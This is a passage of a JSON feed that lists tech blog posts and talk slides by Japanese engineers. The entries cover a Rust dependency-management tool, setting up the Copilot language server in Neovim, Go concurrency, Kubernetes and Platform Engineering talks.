株式会社スリーシェイク.","isoDate":"2025-02-27T02:14:57.000Z","dateMiliSeconds":1740622497000,"authorName":"Sreake","authorId":"Sreake"},{"title":"AI時代におけるMLOpsのTips","link":"https://speakerdeck.com/shukob/aishi-dai-niokerumlopsnotips","contentSnippet":"https://event.ospn.jp/osc2025-spring/session/2017030\\rAI時代におけるMLOpsのTips 〜 MLOpsを加速させるOSS 〜\\rオープンソースカンファレンス2025 Tokyo/Spring\\rライトニングトークにてKubeflowの紹介などMLOpsの話をさせていただきました。","isoDate":"2025-02-22T05:00:00.000Z","dateMiliSeconds":1740200400000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"AIエージェント元年","link":"https://speakerdeck.com/shukob/aiezientoyuan-nian","contentSnippet":"https://genai-users.connpass.com/event/344292/\\r\\r2024年は生成AIが世の中に浸透した1年でしたが、2025年はAIエージェント元年と言われています。\\r\\r生成AIはチャットベースで受け身なものでしたが、AIエージェントは自律的にタスクを分解しこなすことができます。そのインパクトは計り知れません。\\r\\r生成AIの概略を説明した後、AIエージェントの紹介をします。","isoDate":"2025-02-21T05:00:00.000Z","dateMiliSeconds":1740114000000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"コンテナサプライチェーンセキュリティ","link":"https://speakerdeck.com/kyohmizu/kontenasapuraitiensekiyuritei","contentSnippet":"イベント登壇資料です。2025/02/21 #CNCJ\\rhttps://cncj-security.connpass.com/event/341812/","isoDate":"2025-02-21T05:00:00.000Z","dateMiliSeconds":1740114000000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"OpenClarityの裏側を知りたい","link":"https://speakerdeck.com/kojake_300/openclaritynoli-ce-wozhi-ritai-fe15f317-ff7b-4f9e-acd4-8d389e3ebed8","contentSnippet":"","isoDate":"2025-02-20T05:00:00.000Z","dateMiliSeconds":1740027600000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"\uD83E\uDD80 Automating Rust Dependency Management - A Deep Dive into cargo-autodd","link":"https://syu-m-5151.hatenablog.com/entry/2025/02/20/121157","contentSnippet":"\uD83D\uDCD6 IntroductionWhen developing Rust projects, we frequently need to add new crates or remove unused ones. While Rust provides the cargo add command as a standard tool for managing dependencies from the command line:cargo add serde --features deriveHowever, cargo add requires manual execution and doesn\'t detect or remove unused dependencies. To further automate this dependency management process, I developed \\"cargo-autodd\\" \uD83D\uDE80.I developed \\"cargo-autodd\\", a CLI tool to automate dependency management in Rust. It analyzes use statements and extern crates to add required crates to Cargo.toml. Release planned this week with nvim support.https://t.co/ZNfOu4AxEd pic.twitter.com/Tsh0KzEiZV— nwiizo (@nwiizo) 2025年2月16日   \uD83C\uDFAF What is cargo-autodd?cargo-autodd is a tool that automatically analyzes Rust source code to detect required dependencies and updates Cargo.toml accordingly.github.comKey features include:\uD83D\uDD0D Analysis of use statements and extern crate declarations in source code\uD83E\uDD16 Automatic detection of required crates⬆️ Addition of latest stable versions to Cargo.toml\uD83D\uDDD1️ Removal of unused crates⚡ Advanced analysis using rust-analyzer (optional)\uD83D\uDEE0️ Technical Details\uD83D\uDCCA Project Structure AnalysisThe analysis is centered around the DependencyManager struct, which has the following fields:struct DependencyManager {    project_root: PathBuf,  // Project root directory    cargo_toml: PathBuf,    // Path to Cargo.toml}\uD83D\uDD04 Dependency Analysis ProcessThe analyze_dependencies method performs analysis in three stages:\uD83D\uDE80 rust-analyzer Analysis (Priority)let output = Command::new(\\"rust-analyzer\\")    .arg(\\"analysis\\")    .arg(\\"--workspace\\")    .current_dir(&self.project_root)    .output()?;\uD83D\uDCDD Regex Analysis (Fallback)let use_regex = Regex::new(r\\"use\\\\s+([a-zA-Z_][a-zA-Z0-9_]*)(::|\\\\s|;)\\")?;let extern_regex = Regex::new(r\\"extern\\\\s+crate\\\\s+([a-zA-Z_][a-zA-Z0-9_]*)\\")?;✅ Result Aggregation and VerificationRecords usage locations and feature flags for each detected crateExcludes standard library cratesEliminates duplicates\uD83D\uDCDD Cargo.toml Update MechanismThe update_cargo_toml method updates dependencies through the following steps:\uD83D\uDCD6 Reading Current Dependencieslet content = fs::read_to_string(&self.cargo_toml)?;let mut doc = content.parse::<DocumentMut>()?;➕ Adding New Dependenciesfor (name, crate_ref) in crate_refs {    if !current_deps.contains(name) && !is_std_crate(name) {        self.add_dependency(&mut doc, crate_ref)?;    }}➖ Removing Unused DependenciesPreserves essential dependencies specified by is_essential_depfn is_essential_dep(name: &str) -> bool {    let essential_deps = [        \\"serde\\",        \\"tokio\\",        \\"anyhow\\",        \\"thiserror\\",        \\"async-trait\\",        \\"futures\\",    ];    essential_deps.contains(&name)}\uD83D\uDCC8 Version Management DetailsVersion management is handled by the get_latest_version method with the following features:\uD83C\uDF10 Fetching Latest Version from crates.io APIlet url = format!(\\"https://crates.io/api/v1/crates/{}/versions\\", crate_name);\uD83D\uDEAB Excluding Yanked Versionslet latest_version = response    .versions    .iter()    .find(|v| !v.yanked)?;\uD83D\uDD22 Applying Semantic VersioningSpecifies only major and minor versionsAllows automatic patch version updatesOk(format!(\\"^{}.{}.0\\", version.major, version.minor))\uD83D\uDCDA Best Practices and Usage Guidelines\uD83D\uDD27 PreparationInstall rust-analyzer (recommended)Ensure project builds successfully\uD83D\uDE80 Execution StepsRun cargo autodd in the project root directoryReview the changesPay special attention to version specificationsVerify dependency consistency with cargo check\uD83D\uDD0D TroubleshootingFalls back to regex analysis if rust-analyzer is unavailableManually correct any falsely detected dependencies\uD83D\uDD2E Future PlansFuture enhancements planned for cargo-autodd include:\uD83D\uDD0D Enhanced AnalysisMacro expansion and dependency analysisMore accurate feature flag detectionConsideration of conditional compilation (cfg attributes)\uD83D\uDCE6 Extended Dependency ManagementAutomatic management of dev-dependenciesEnhanced workspace supportAutomatic version conflict resolution\uD83D\uDCBB Improved Developer ExperienceEditor integration (e.g., VSCode extension)More detailed dependency graph visualizationCI automation options\uD83C\uDF89 Conclusioncargo-autodd is a powerful tool for automating dependency management in Rust projects. Its strengths can be summarized in three key areas:⚡ Enhanced EfficiencyEliminates manual dependency management overheadMaintains project dependencies at latest necessary versionsImproves maintainability through automated version management\uD83D\uDD12 Ensured SafetyAccurate dependency analysis using rust-analyzerProper handling of semantic versioningProtection of essential dependencies\uD83C\uDFAF Improved Developer ExperienceSimple usage patternReduced maintenance time through automationClear visualization of project dependenciesThese features allow developers to focus more on essential coding tasks. As an open-source project, it continues to evolve through community feedback and contributions.cargo-autodd is expected to become an increasingly important tool as the Rust ecosystem matures. We hope it serves as an effective solution to the challenge of dependency management for many developers in the Rust community. \uD83D\uDE80日本語版:syu-m-5151.hatenablog.com","isoDate":"2025-02-20T03:11:57.000Z","dateMiliSeconds":1740021117000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Rustの依存関係管理を自動化する - cargo-autoddの紹介","link":"https://syu-m-5151.hatenablog.com/entry/2025/02/20/120339","contentSnippet":"はじめにRustプロジェクトを開発していると、新しいクレートを追加したり不要なクレートを削除したりする作業は頻繁に発生します。現在、Rustにはcargo addというコマンドが標準で用意されており、コマンドラインから依存関係を追加することができます。cargo add serde --features deriveしかし、cargo addは手動での実行が必要で、また使用していない依存関係の検出や削除は行いません。この依存関係の管理をさらに自動化できないか？という思いから開発したのが「cargo-autodd」です。Rustで開発する際の面倒な依存関係管理を自動化するツール「cargo-autodd」を開発しました。ソースコード内のuse文やextern crate宣言を解析し、必要なクレートを自動でCargo.tomlに追加します。先ほど作ったのでバグや不具合があると思うのでPRお願いします。テストもない。https://t.co/ZNfOu4AxEd pic.twitter.com/RbQNyp0K8H— nwiizo (@nwiizo) 2025年2月16日   cargo-autoddとはcargo-autoddは、Rustのソースコードを解析して必要な依存関係を自動的に検出し、Cargo.tomlを更新するツールです。github.com主な特徴は以下の通りです：ソースコード内のuse文とextern crate宣言を解析必要なクレートを自動検出Cargo.tomlに最新の安定バージョンを追加未使用のクレートを削除rust-analyzerを活用した高度な解析（オプション）技術的な詳細プロジェクト構造の解析プロジェクトの解析はDependencyManager構造体を中心に行われます。この構造体は以下のようなフィールドを持ちます：struct DependencyManager {    project_root: PathBuf,  // プロジェクトのルートディレクトリ    cargo_toml: PathBuf,    // Cargo.tomlのパス}依存関係の解析プロセスanalyze_dependenciesメソッドは、以下の3段階で依存関係を解析します：rust-analyzerによる解析（優先）let output = Command::new(\\"rust-analyzer\\")    .arg(\\"analysis\\")    .arg(\\"--workspace\\")    .current_dir(&self.project_root)    .output()?;正規表現による解析（フォールバック）let use_regex = Regex::new(r\\"use\\\\s+([a-zA-Z_][a-zA-Z0-9_]*)(::|\\\\s|;)\\")?;let extern_regex = Regex::new(r\\"extern\\\\s+crate\\\\s+([a-zA-Z_][a-zA-Z0-9_]*)\\")?;結果の集約と検証検出された各クレートに対して、使用箇所とフィーチャーフラグを記録標準ライブラリのクレートを除外重複を排除Cargo.tomlの更新メカニズムupdate_cargo_tomlメソッドは、以下の手順で依存関係を更新します：現在の依存関係の読み取りlet content = fs::read_to_string(&self.cargo_toml)?;let mut doc = content.parse::<DocumentMut>()?;新規依存関係の追加for (name, crate_ref) in crate_refs {    if !current_deps.contains(name) && !is_std_crate(name) {        self.add_dependency(&mut doc, crate_ref)?;    }}未使用依存関係の削除ただし、is_essential_depで指定された重要な依存関係は保持fn is_essential_dep(name: &str) -> bool {    let essential_deps = [        \\"serde\\",        \\"tokio\\",        \\"anyhow\\",        \\"thiserror\\",        \\"async-trait\\",        \\"futures\\",    ];    essential_deps.contains(&name)}バージョン管理の詳細バージョン管理はget_latest_versionメソッドで行われ、以下の特徴があります：crates.ioのAPIを使用した最新バージョンの取得let url = format!(\\"https://crates.io/api/v1/crates/{}/versions\\", crate_name);Yank済みバージョンの除外let latest_version = response    .versions    .iter()    .find(|v| !v.yanked)?;セマンティックバージョニングの適用メジャーバージョンとマイナーバージョンのみを指定パッチバージョンは自動更新可能にOk(format!(\\"^{}.{}.0\\", version.major, version.minor))ベストプラクティスと使用上の注意点事前準備rust-analyzerのインストール（推奨）プロジェクトのビルドが通っていることを確認実行手順プロジェクトのルートディレクトリでcargo autoddを実行変更内容を必ず確認特にバージョン指定に注意を払うcargo checkで依存関係の整合性を検証トラブルシューティングrust-analyzerが使用できない場合は正規表現による解析にフォールバック誤検出された依存関係は手動で修正今後の展望cargo-autoddの将来的な機能拡張として、以下を計画しています：解析機能の強化マクロの展開とその依存関係の解析より正確なフィーチャーフラグの自動検出条件付きコンパイル（cfg属性）の考慮依存関係管理の拡張開発依存関係（dev-dependencies）の自動管理ワークスペース対応の強化バージョン競合の自動解決開発者体験の向上エディターへの組み込み（VSCode拡張など）より詳細な依存関係グラフの可視化CIでの自動実行オプションまとめcargo-autoddは、Rustプロジェクトにおける依存関係管理の自動化を実現する強力なツールです。その特徴は以下の点にあります：効率性の向上手動での依存関係管理の煩わしさを解消プロジェクトの依存関係を常に最新かつ必要最小限に保持バージョン管理の自動化による保守性の向上安全性の確保rust-analyzerを活用した正確な依存関係の解析セマンティックバージョニングの適切な処理重要な依存関係の保護機能開発者体験の改善シンプルな使用方法自動化による作業時間の削減プロジェクトの依存関係の可視化これらの機能により、開発者はより本質的なコーディング作業に集中できるようになります。また、オープンソースプロジェクトとして公開されているため、コミュニティからのフィードバックや貢献を受け入れながら、さらなる機能改善を進めていく予定です。cargo-autoddは、Rustエコシステムの成熟に伴い、より重要なツールとなることが期待されます。依存関係管理の自動化という課題に対する一つの解決策として、多くの開発者の方々に活用していただければ幸いです。English Edition:syu-m-5151.hatenablog.com","isoDate":"2025-02-20T03:03:39.000Z","dateMiliSeconds":1740020619000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"コードを読んで理解するko build","link":"https://speakerdeck.com/bells17/kotowodu-nteli-jie-suruko-build","contentSnippet":"Jagu\'e\'r Cloud Native #17 ハイブリッド Meetup ~ 推しの CNCF プロジェクトを紹介するぜ LT ~ の登壇資料です。\\rhttps://jaguer-cloud-native.connpass.com/event/342024/\\r\\r参考リンク・画像など引用元一覧\\rhttps://ko.build/ \\rhttps://github.com/ko-build/ko \\rhttps://github.com/google/go-containerregistry \\rhttps://github.com/sigstore/cosign \\rhttps://github.com/opencontainers/image-spec \\rhttps://github.com/cncf/sandbox/issues/17 \\rhttps://github.com/ko-build/ko/issues/791 \\rhttps://github.com/cncf/sandbox/issues/163 \\rhttps://github.com/cncf/artwork/blob/main/projects/ko/stacked/color/ko-stacked-color.png \\rhttps://github.com/cncf/artwork/blob/main/projects/ko/icon/color/ko-icon-color.png","isoDate":"2025-02-19T05:00:00.000Z","dateMiliSeconds":1739941200000,"authorName":"bells17","authorId":"bells17"},{"title":"CNCFの公式ブログ「Japan’s CNCF DevStats 2024」にて、スリーシェイク所属のエンジニア2名がCNCFプロジェクトでの貢献者TOP10にランクイン","link":"https://sreake.com/blog/rank-among-top-contributors-to-cncf-projects-in-japan/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）は、 CNCF（Cloud Native Computing Foundation）の公式ブログ「Japan’s CNCF DevStats 2024」にて、スリーシェイク所属のエンジニア 早川大貴・長澤翼（以下早川・長澤）がCNCFプロジェクトでの貢献者TOP10にランクインしたことをお知らせします。The post CNCFの公式ブログ「Japan’s CNCF DevStats 2024」にて、スリーシェイク所属のエンジニア2名がCNCFプロジェクトでの貢献者TOP10にランクイン first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-02-18T01:00:00.000Z","dateMiliSeconds":1739840400000,"authorName":"Sreake","authorId":"Sreake"},{"title":"AWS SAM と GitHub Actions で爆速でサーバーレス API をデプロイする","link":"https://sreake.com/blog/aws-sam-quick-deploy-with-github-actions/","contentSnippet":"こんにちは。スリーシェイクの小林です。 本日は AWS Serverless Application Model（以下、AWS SAM）と GitHub Actions を用いて サーバーレス API の作成からデプロイ […]The post AWS SAM と GitHub Actions で爆速でサーバーレス API をデプロイする first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-02-16T23:00:00.000Z","dateMiliSeconds":1739746800000,"authorName":"Sreake","authorId":"Sreake"},{"title":"goroutineによる頻出並行処理パターン2選","link":"https://zenn.dev/kamos/articles/c334faad2d3b33","contentSnippet":"はじめにgoruotineはgo言語の軽量スレッドの仕組みであり、並行処理が比較的簡単に実装できます。しかしその自由度の高さから、慣れていない人にとってはどのように実装したらよいのか、という迷いが生まれてしまいます。その中でもよく使う並行処理のパターンは決まっており、今回はよく自分が使うパターンを2つ紹介します。 前提こういう遅くて、エラーも起こる関数をテーマにします。func slowFunction(arg string) (string, error) {\\tfmt.Printf(\\"SLOW FUNCTION START: %s\\\\n\\", arg)\\tstart :=...","isoDate":"2025-02-16T08:56:32.000Z","dateMiliSeconds":1739696192000,"authorName":"Makoto Kamono","authorId":"kamono"},{"title":"自分ばっかり大変と思ってるときは気をつけたほうがいい","link":"https://nnaka2992.hatenablog.com/entry/2025/02/16/140946","contentSnippet":"仕事をしていて数年ほどたつと自分はこんなに頑張ってるのに評価が低いと思うタイミングが来る。これは後々そんなことはなかったと気がつくものの、そのタイミングにいる間は不適当な評価を受けていると思いがちで、自尊心が肥大しがちである。自分ばっかり頑張っていると感じたときは、自分の仕事が本当に価値を生んでいるのかという観点に立ち返ったほうがいい。やらなくてもいい仕事に忙殺されていないか？ 楽してると思ってる人は本質的な仕事に集中しているのではないか？これはイシューからはじめよでいうところの犬の道に陥っている状態である。自分だけ大変と思っているときは、実際には価値を生み出していないにも限らず、仕事量によ達成感を成果と勘違いしていることが多い。自分ばっかり大変だ、となっているときは価値の低いことに時間を投入していないか見つめ直そうという自戒。","isoDate":"2025-02-16T05:09:46.000Z","dateMiliSeconds":1739682586000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"【基礎】 GoでSpannerを使う","link":"https://zenn.dev/kamos/articles/b06c3ef3de894a","contentSnippet":"はじめにGoogleのSpannerデータベースはまだまだ知名度が低く、日本語での文献も豊富ではないため、いざ使うとなるとかなり苦労する技術です。ここでは最低限の概念を説明することにつとめ、通常利用においてSpannerのハードルを下げようと思いこの記事を執筆しました。基本的には以下の資料に載っている情報かと思いますが、実際にソースコードを見るとドキュメントの更新が追いついていない部分が多い印象でした。そのためクライアントライブラリのソースコードに可能な限り追従し、できるだけ平易な文章でまとめようと思います。https://cloud.google.com/spanner/do...","isoDate":"2025-02-16T03:29:52.000Z","dateMiliSeconds":1739676592000,"authorName":"Makoto Kamono","authorId":"kamono"},{"title":"runwasi の cgroup に関する Issue 調査","link":"https://zenn.dev/z63d/articles/48eb53ca4e8467","contentSnippet":"概要runwasi で cgroup に関する Issue があり、それについての調査の記録です。忘れないように。OCI Runtime ~ コンテナプロセス周りのデバッグのコツを少しつかめた。cgroup に関しても学ぶことが多かった。 runwasirunwasi は Kubernetes で Ｗasm を動かすための shim をつくるライブラリ & いくつかの Wasm runtime 用の shim です。runwasi については以前 Kubernetes Meetup Tokyo #68 KubeCon NA 2024 Recap で話した時の資料と...","isoDate":"2025-02-14T13:44:01.000Z","dateMiliSeconds":1739540641000,"authorName":"Kaita Nakamura","authorId":"kaita-nakamura"},{"title":"nwiizo はなぜ同じPlatform Engineeringを語るのに、2つの異なる資料を作ったのか #devsumi #PFEM","link":"https://syu-m-5151.hatenablog.com/entry/2025/02/14/071127","contentSnippet":"はじめにこんにちは、nwiizoです。2025年2月13日に2つのイベントで登壇する機会をいただきました。これは私が翻訳に関わった「Kubernetesで実践するPlatform Engineering」の発売を記念した販促登壇でしたが、原著者さんが書籍の内容自体について話をされると知っていたので、私はPlatform Engineeringという分野に関する自分なりの考えや経験を共有させていただく内容にしました。Kubernetesで実践する Platform Engineering作者:Mauricio Salatino翔泳社Amazon2つの異なるイベントでの発表同日に性質の異なる2つのイベントで話をさせていただきました。Developers Summitでは「インフラをつくるとはどういうことなのか、あるいはPlatform Engineeringについて」というタイトルで、幅広い技術者の方々に向けてPlatform Engineeringの基本的な考え方から実践的なアプローチまでをお話ししました。 speakerdeck.com一方、PFEM特別回では「Platform Engineeringは自由のめまい - 技術の選択における不確実性と向き合う」というテーマで、より専門的な視点からPlatform Engineeringの課題や可能性について話をしました。ただ、この回は資料作りや登壇などの疲れもピークに達していて、本来伝えたかったことと違う説明をしてしまった部分もあったように思います。 speakerdeck.com翻訳作業から得た気づき今回の発表の背景には、「Kubernetesで実践するPlatform Engineering」の翻訳作業があります。2025年2月19日に翔泳社から発売されるこの本は、\\"Platform Engineering on Kubernetes\\"の日本語翻訳版で、3-shake の同僚と一緒に取り組んだプロジェクトです。翻訳作業を通じて、Platform Engineeringの課題や可能性について考える機会を多く得ることができました。原著者のsalaboyさんのハンズオンや過去の発表資料、記事を読む中で、Platform Engineeringに対する彼の考え方を学ばせていただきました。実際に一緒に登壇する機会もいただき、私の拙い英会話力にも関わらず温かく接していただいたことも貴重な経験でした。登壇から学んだこと今回の登壇準備と実践を通じて、技術共有における重要な気づきがありました。最も重要だと感じたのは、聴衆のバックグラウンドに合わせて内容を適切に調整することです。Developers SummitとPFEM特別回では、参加者層が大きく異なりました。Developers Summitでは、DevOpsやPlatform Engineeringに詳しくない参加者が多く、日常的な開発における具体的な問題点から入り、それをPlatform Engineeringの文脈で捉え直すことで基礎的な理解を促しました。一方、PFEM特別回では参加者との間に共通認識があったため、より実践的な課題や技術的解決策について深く掘り下げることができました。この違いは技術資料の作成にも影響しました。資料作成では、「知的な発見」と「理解するためのコスト」のバランスが重要です。知的な発見とは「なるほど、そういう考え方があったのか」という新しい視点を得られる瞬間ですが、その発見に至るまでの説明が複雑すぎると理解へのコストが大きくなりすぎてしまいます。多くの技術プレゼンテーションでは既知の問題とその解決策を列挙することに終始しがちですが、それだけでは予想外の学びには至りません。予想外の学びこそが、聴衆の心に残る知的な発見として認知されやすいのです。ここで重要なのは、単に「よくある課題とその解決策」を並べるだけでなく、「明確には意識していなかったけれど、言われてみれば確かにそうだった」という新たな気づきを提供することです。例えば、日々の開発で感じている不便さを Platform Engineering の文脈で捉え直すことで、それが個人の問題ではなく構造的な課題だったと気づく瞬間を作り出せます。かといって基礎的な前提ばかりでは、聴衆にとって新しい気づきが得られません。Developers Summitでは基礎と新知見のバランスを重視し、PFEM特別回では基礎的な説明を最小限に抑え、より深い技術的な議論に時間を割きました。それ以外の「イライラ」「焦り」「困惑」といった感情は、むしろ読者の集中力を削ぎ、本質的な学びを妨げてしまう。技術資料は、共感と発見のポジティブな体験に徹するべきなのだ。確かに、高度な実装や複雑な概念を詰め込んだ資料を作ることは可能だ。しかし、そのような難解な内容は、読者の理解を遠ざけ、結果として伝えたい本質が埋もれてしまう。読者の多くがこのような否定的な感情を抱く資料は、作成者の自己満足に過ぎないと言えるでしょう。2025年ならではの発見として、Xのアルゴリズム変更により画像が優先表示されるようになった現在、印象に残るスライドを含めることが効果的です。複雑な概念を一枚の図で表現することで、SNS上での共有や議論が促進され、発表後もコミュニティでの対話が継続する可能性が高まります。また、Platform Engineeringという新しい分野では、技術コミュニティにおける「共通言語」の重要性も実感しました。Developers Summitではキーとなる概念を具体例と共に丁寧に説明し、PFEM特別回では既存の共通言語を活用してより専門的な議論を展開しました。知識を一方的に伝えるのではなく、参加者との対話を通じて互いに学び合える場を作ることを心がけ、翻訳者兼登壇者としての過剰な発言は控えました。この経験を通じて、技術を伝えることは単なる知識の転送ではなく、聴衆のコンテキストに寄り添いながら対話を生み出すプロセスだと実感しました。イベントの性質や参加者層によって求められる内容や深さが異なることを学び、今後もこの気づきを活かしながら効果的な技術共有を目指していきます。おわりに2つのイベントでの発表資料は異なる切り口で作成しましたが、どちらも力を入れて準備させていただきました。より詳細な内容についてはぜひ資料をご覧いただければと思います。また、完全版については機会があればお話させていただきたいと考えていますので、ご興味がありましたらぜひご依頼ください。最後に、この経験を通じて得られた知見を今後の活動にも活かしていきたいと考えています。ご清聴いただいた皆様、そして貴重な機会を提供してくださった関係者の皆様に心より感謝申し上げます。","isoDate":"2025-02-13T22:11:27.000Z","dateMiliSeconds":1739484687000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"インフラをつくるとはどういうことなのか、 あるいはPlatform Engineeringについて","link":"https://speakerdeck.com/nwiizo/inhurawotukurutohadouiukotonanoka-aruihaplatform-engineeringnituite","contentSnippet":"2025年02月13日 Developers Summit 2025 13-E-4 にて「インフラをつくるとはどういうことなのか、 あるいはPlatform Engineeringについて - Platform Engineeringの効果的な基盤構築のアプローチ」というタイトルで登壇します。同日にPFEM特別回 でも登壇するのですが資料頑張って作ったのでそっちも読んでください。完全版は機会があればお話するので依頼してください。\\r\\rイベント名:  Developers Summit 2025\\r\\r公式URL: https://event.shoeisha.jp/devsumi/20250213\\r\\rセッションURL: https://event.shoeisha.jp/devsumi/20250213/session/5546\\r\\r登壇ブログ: https://syu-m-5151.hatenablog.com/entry/2025/02/14/071127","isoDate":"2025-02-13T05:00:00.000Z","dateMiliSeconds":1739422800000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"国内４大通信キャリアのビジネスまとめ表","link":"https://qiita.com/masaru-komiyama/items/07b8eec241e41c1e0ebb","contentSnippet":"ふと、「国内通信キャリア各社のビジネスってどうなってるんだろう。サクッと確認したいからまとまった表があるといいなぁ」　と検索した際、あまり良い情報がヒットしなかった ＆ AI使っても微妙な結果しか得…","isoDate":"2025-02-13T01:24:19.000Z","dateMiliSeconds":1739409859000,"authorName":"masaru-komiyama","authorId":"masaru-komiyama"},{"title":"Platform Engineeringは自由のめまい ","link":"https://speakerdeck.com/nwiizo/platform-engineeringhazi-you-nomemai","contentSnippet":"2025年02月13日 Kubernetesで実践するPlatform Engineering発売記念！ PFEM特別回にて「Platform Engineeringは自由のめまい - 技術の選択における不確実性と向き合う」というタイトルで登壇します。同日にDevelopers Summit 2025 でも登壇したのですが資料頑張って作ったのでそっちも読んでください。\\r\\rイベント名: Kubernetesで実践するPlatform Engineering発売記念！ PFEM特別回\\r\\r公式URL: https://platformengineering.connpass.com/event/342670/\\r\\r登壇ブログ: https://syu-m-5151.hatenablog.com/entry/2025/02/14/071127","isoDate":"2025-02-12T05:00:00.000Z","dateMiliSeconds":1739336400000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Neovimで始めるGitHub Copilot - copilot.lua による Language Server の設定方法","link":"https://syu-m-5151.hatenablog.com/entry/2025/02/11/183337","contentSnippet":"github.blogこの設定は一時的なものであり、LSPのインストーラーが対応したらそちらで対応してください。github.comはじめに2025年2月10日、GitHubはCopilot Language Server SDKを公開しました。これは、エディタやIDEがLanguage Server Protocol（LSP）を通じてGitHub Copilotと連携できるものです。このリリースは、開発者がより柔軟にCopilotを利用できるようになる重要な一歩です。今までGitHub CopilotはVS Code、Visual Studio、JetBrains IDEs、Vim/Neovim、そして最近ではXcodeでも利用可能でしたが、これらのエディタすべてがCopilot Language Serverを使用して実装されていました。GitHubは開発者の選択肢を重視し、好みのエディタでCopilotを使用できるようにすることを目指しているみたいです。Copilotの進化NeovimでのCopilot利用は、以前はgithub/copilot.vimを通じて行われていました。このVimscriptベースのプラグインは、多くの開発者に利用されてきた公式の実装です。その後、Lua APIを活用したzbirenbaum/copilot.luaが登場しましたが、これも内部的にはcopilot.vimを通じてGitHub Copilotと通信を行っていました。このアーキテクチャでは、copilot.luaがNeovimのモダンなLua APIを活用した柔軟なインターフェースを提供し、バックエンドではcopilot.vimが実際のCopilotサービスとの通信を担当するという二層構造になっていました。そして今回のLanguage Server SDKの公開により、エディタとCopilotの連携方法が標準化され、直接Language Server Protocolを介してCopilotと通信できるようになりました。これにより、中間レイヤーが不要になり、より効率的で安定した実装が可能になりました。前提条件Neovim 0.8.0以上Node.js 18.x以上GitHubアカウント（Copilotのサブスクリプション）インストール手順1. Copilot Language Serverのインストールまず、Neovimの設定ディレクトリにCopilot用のディレクトリを作成し、Language Serverをインストールします。# Copilot用ディレクトリの作成mkdir -p ~/.config/nvim/copilot/# Language Serverのインストールnpm install @github/copilot-language-server -g --prefix ~/.config/nvim/copilot/# 実行権限の付与chmod +x ~/.config/nvim/copilot/bin/copilot-language-server2. Neovimプラグインのインストールlazy.nvimを使用している場合、以下の設定を~/.config/nvim/lua/plugins/copilot.luaに追加します。return {  \\"zbirenbaum/copilot.lua\\",  lazy = false,  priority = 1000,  config = function()    require(\\"copilot\\").setup {      suggestion = { enabled = false },      panel = { enabled = false },      server_opts_overrides = {        trace = \\"verbose\\",        cmd = {          vim.fn.expand(\\"~/.config/nvim/copilot/bin/copilot-language-server\\"),          \\"--stdio\\"        },        settings = {          advanced = {            listCount = 10,            inlineSuggestCount = 3,          },        },      },      filetypes = {        yaml = true,        markdown = true,        help = false,        gitcommit = true,        gitrebase = true,        hgcommit = false,        svn = false,        cvs = false,        [\\".\\"] = false,        [\\"*\\"] = true,      },    }  end,}3. 認証設定Neovimを起動後、以下のコマンドで認証を行います。:Copilot authブラウザが開き、GitHubアカウントでの認証が求められます。認証が完了すると、Copilotが使用可能になります。設定の説明設定の主要なポイントを解説します。この設定は私の設定ファイルなので自由に設定してください。suggestionとpanelenabled = false: デフォルトのサジェスト機能を無効化していますserver_opts_overridescmd: インストールしたLanguage Serverのパスと起動オプションを指定vim.fn.expand(\\"~/.config/nvim/copilot/bin/copilot-language-server\\"): Language Serverの実行ファイルのパスを指定。vim.fn.expand()関数を使用して~をホームディレクトリに展開\\"--stdio\\": Language Serverが標準入出力（stdio）を使用してNeovimと通信することを指定するオプションsettings.advanced:   - settings.advanced:listCount: 候補の表示数（10個）inlineSuggestCount: インラインサジェストの数（3個）filetypes各ファイルタイプでのCopilotの有効/無効を設定[\\"*\\"] = true: デフォルトですべてのファイルタイプで有効トラブルシューティングLanguage Serverが見つからない場合Error: Language server is not installed or not executableパスが正しいか確認実行権限が付与されているか確認chmod +xコマンドで実行権限を付与認証エラーの場合:Copilot authを再実行GitHubアカウントのサブスクリプション状態を確認まとめGitHub Copilot Language Server SDKの公開により、Neovimでより直接的にCopilotを利用できるようになりました。これまでのcopilot.vimを経由する方式から、直接Language Server Protocolを使用する方式への移行により、より効率的で保守性の高い実装が可能になりました。新しいSDKはnpmjs.comで公開されており、誰でも利用可能です。この変更により、エディタ開発者はより簡単にCopilotを統合でき、ユーザーはより安定した開発体験を得られるようになります。また、この方法は本来であれば不要でありlspconfigにコントリビューションすればよい()。github.com参考リンクGitHub Copilot Language Server SDK announcementCopilot.lua DocumentationLanguage Server Protocol SpecificationGitHub Copilot.vim","isoDate":"2025-02-11T09:33:37.000Z","dateMiliSeconds":1739266417000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"n週刊アトデ 2025-02-10","link":"https://blog.atusy.net/2025/02/10/atodeyomanakata/","contentSnippet":"アトデヨム、ウソジャナイ、ヨムノタノシー","isoDate":"2025-02-10T00:00:00.000Z","dateMiliSeconds":1739145600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"kubeadmでk8sクラスタを構築する","link":"https://zenn.dev/moz_sec/articles/k8s-by-kubeadm","contentSnippet":"KubernetesKubernetesとは、複数のコンピュータでコンテナをいい感じに動かしてくれるものです。Kubernetesの説明はいろんなサイトに書いてあるため、そちらを参照してください。公式サイトも参考になります。https://kubernetes.io/docs/concepts/overview/ kubeadmkubeadmは、Kubernetesクラスタを構築するためのツールの１つです。他にも、kopsやkubesprayなどがありますが、kubeadmは最小限の構成でクラスタを構築することができます。https://kubernetes.io/...","isoDate":"2025-02-07T02:00:09.000Z","dateMiliSeconds":1738893609000,"authorName":"Kobayashi Shun","authorId":"moz-sec"},{"title":"GKEのComputeClassに関する調査","link":"https://sreake.com/blog/gke-computeclass/","contentSnippet":"はじめに Sreake事業部で長期インターンをしている竜です。 本記事では、GKEのカスタムコンピューティングクラスについて調査を行いました。 カスタムコンピューティングクラスの概要 